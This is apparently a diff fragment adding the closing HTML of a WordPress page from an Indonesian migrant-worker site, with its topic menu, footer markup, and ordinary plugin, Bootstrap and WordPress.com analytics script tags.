+<li id="menu-item-5814" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5814"><a href="http://buruhmigran.or.id/topik/ekonomi-bisnis/">Ekonomi</a></li>
+<li id="menu-item-5815" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5815"><a href="http://buruhmigran.or.id/topik/info-negara-tujuan/">Info Negara Tujuan</a></li>
+<li id="menu-item-5816" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5816"><a href="http://buruhmigran.or.id/topik/jejak-kasus/">Jejak Kasus</a></li>
+<li id="menu-item-5817" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5817"><a href="http://buruhmigran.or.id/topik/kajian/">Kajian</a></li>
+<li id="menu-item-5818" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5818"><a href="http://buruhmigran.or.id/topik/kisah-2/">Kisah</a></li>
+<li id="menu-item-5819" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5819"><a href="http://buruhmigran.or.id/topik/kontak-pakar/">Kontak Pakar</a></li>
+<li id="menu-item-5820" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5820"><a href="http://buruhmigran.or.id/topik/panduan-3/">Panduan</a></li>
+<li id="menu-item-5821" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5821"><a href="http://buruhmigran.or.id/topik/peryataan-pers/">Peryataan Pers</a></li>
+<li id="menu-item-5822" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5822"><a href="http://buruhmigran.or.id/topik/produk/">Produk</a></li>
+<li id="menu-item-5823" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5823"><a href="http://buruhmigran.or.id/topik/tajuk/">Tajuk</a></li>
+</ul></div></aside>			</div><!-- #primary-sidebar -->
+					</div>
+	</footer>
+</div>
+<!-- End : Footer Row -->
+
+<!-- Start : Footer Line Row -->
+<div class="row" id="footer-line">&nbsp;</div>
+<!-- End : Footer Line Row -->
+
+</div>
+<!-- End Container -->
+<!-- ngg_resource_manager_marker --><script type='text/javascript' src='http://buruhmigran.or.id/wp-content/plugins/ultimate-tables/js/jquery.dataTables.min.js?ver=1.0'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var tocplus = {"visibility_show":"show","visibility_hide":"hide","width":"Auto"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://buruhmigran.or.id/wp-content/plugins/table-of-contents-plus/front.min.js?ver=1509'></script>
+<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201540'></script>
+<script type='text/javascript' src='http://buruhmigran.or.id/wp-content/themes/buruhmigran/js/bootstrap.min.js?ver=3.1.1'></script>
+<script type='text/javascript' src='http://buruhmigran.or.id/wp-content/themes/buruhmigran/js/trigger.js?ver=1.0.0'></script>
+<script type='text/javascript' src='http://stats.wp.com/e-201540.js' async defer></script>
+<script type='text/javascript'>
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:3.6.1',blog:'86875332',post:'0',tz:'7',srv:'buruhmigran.or.id'} ]);
+	_stq.push([ 'clickTrackerInit', '86875332', '0' ]);
+</script>
+</body>
+</html>
